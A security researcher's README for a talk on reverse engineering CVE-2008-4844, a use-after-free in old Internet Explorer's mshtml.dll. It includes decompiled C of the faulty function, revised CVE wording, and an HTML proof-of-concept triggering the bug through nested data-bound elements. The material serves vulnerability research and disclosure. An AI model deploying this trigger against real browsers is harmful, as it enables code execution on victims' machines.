```
          .___                            __  .__
          |   | ____   ____  ____ _______/  |_|__| ____   ____
          |   |/    \_/ ___\/ __ \\____ \   __\  |/  _ \ /    \
          |   |   |  \  \__\  ___/|  |_> >  | |  (  <_> )   |  \
          |___|___|__/\_____>_____>   __/|__| |__|\____/|___|__/
                                  |__|
                      _______________  ____ ____
                      \_____  \   _  \/_   /_   |
                       /  ____/  /_\  \|   ||   |
                      /       \  \_/   \   ||   |
                      \________\_______/___||___|
                      
```
# Inception 2011
_"Sometimes, the best way to advance is in reverse"_. ([Reversing: Secrest of Reverse Engineering](https://en.wikipedia.org/wiki/Reversing:_Secrets_of_Reverse_Engineering))

Every time any new vulnerability comes out we should be ready to understand it, in order to perform its exploitation or even to build defenses. [Reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) is one of the most powerful approaches.

Many talks have been done in the last years, as well as too many useless information has been given by security community:
* Some talks have addressed particular frameworks, specific tools and a few libraries.
* No practical demonstration and/or tips and tricks regarding vulnerabilities, leaving the **black magic** hidden to the audience.

This [talk](https://github.com/nbrito/talks/blob/master/2016/ibm-systems/nbrito-inception.pdf) shares some tips and trick learned during real vulnerability reversing process, such as:
* Gathering information about the vulnerability.
* Understand the weakness type.
* Preparing the vulnerable ecosystem.
* Building a toolbox to be used.
* [Reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) the vulnerability.
* Etc...

It shows, using very detailed [demonstration](https://vimeo.com/nbrito), how to achieve the **state-of-art** building exploitation and defenses, using your own exploitation skills.

The **black magic** is finally unveiled, showing how to use tools (public available) to understand and apply [reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) to a vulnerability.

## Root Cause

###  ```CRecordInstance::TransferToDestination``` Reverse Engineered Code
```
int CRecordInstance::TransferToDestination () {
    int ebp_minus_4h, eax;
    int esi, ebx = 0;
    
    esi = (sizeof(edi) >> 2) - 1;

    ebp_minus_4h = ebx;
    
    do{
        if(edi[ebx] == 0) continue;

        eax = edi[ebx]->TransferFromSrc();

        if((ebp_minus_4h == 0) && (eax != 0))
            ebp_minus_4h = eax;

        ebx++;
    }while(ebx <= esi);

    return(ebp_minus_4h);
}
````

For further information, please, refer to this [link](https://github.com/nbrito/research/tree/master/inception/reversing).

## [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) Description
After three years, the CVE Editorial Board has decided to change the description for [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) based on this research. As a direct result, the [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) is much more accurate than before. Check by yourself...

### Previous
_Use-after-free vulnerability in mshtml.dll in Microsoft Internet Explorer 5.01, 6, and 7 on Windows XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, and Server 2008 allows remote attackers to execute arbitrary code via a crafted XML document containing nested SPAN elements, as exploited in the wild in December 2008._

### Current
_Use-after-free vulnerability in the ```CRecordInstance::TransferToDestination``` function in mshtml.dll in Microsoft Internet Explorer 5.01, 6, 6 SP1, and 7 allows remote attackers to execute arbitrary code via DSO bindings involving (1) an XML Island, (2) XML DSOs, or (3) Tabular Data Control (TDC) in a crafted HTML or XML document, as demonstrated by nested ```SPAN``` or ```MARQUEE``` elements, and exploited in the wild in December 2008._

### Lacking Further Information
Even with this update, the [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) description still lacks further information, because nested ```DIV```, ```LABEL```, ```LEGEND```, ```MARQUEE``` and ```SPAN``` elements can also be used to reprocude the vulnerability, and they doesn not even need to be the same, they can be mixed. Example:
```
<HTML>
<SCRIPT LANGUAGE="JavaScript">
function Inception (){
	document.getElementById("b00m").innerHTML =
		"<XML ID=I>" +
		"<X>" +
		"<C>" +
		"&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;" +
		"</C>" +
		"</X>" +
		"</XML>" +
		"<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>" +
		"<DIV DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>" +
		"</DIV>" +
		"</SPAN>";
}
</SCRIPT>
<BODY onLoad="Inception();">
<DIV ID="b00m" STYLE="display: none;">
</DIV>
</BODY>
</HTML>
```
For further information, please, refer to this [link](https://github.com/nbrito/research/tree/master/pop/html/ips-bypass-test-bed).

## Credits
[Nelson Brito](https://fnstenv.blogspot.com) (a.k.a. repository's owner)

## Disclaimer
Codes are available for research purposes only, and the repository's owner vehemently denies the malicious use, as well as the illegal purpose use, of any information, code and/or tool contained in this repository.

If you think there is any information, code and/or tool that sould not be here, please, contact the repository's owner.

## Warning
This repository does not provide you with any legal rights to any intellectual property in any information, code and/or tool, also, be aware that the use of some information, code and/or tool may be forbidden in some countries, and there may be rules and laws prohibiting any unauthorized user from use the information, code and/or tool, being these actions considered illegal.
